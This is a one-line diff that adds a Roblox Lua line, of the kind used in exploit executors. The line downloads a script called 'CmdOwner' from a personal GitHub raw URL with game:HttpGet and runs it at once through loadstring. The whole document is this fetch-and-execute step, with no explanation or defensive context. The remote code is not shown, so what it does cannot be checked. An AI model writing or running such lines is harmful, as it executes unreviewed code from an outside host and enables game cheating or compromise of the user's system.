@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vinciuszk70/vinciuszk70/main/CmdOwner", true))()
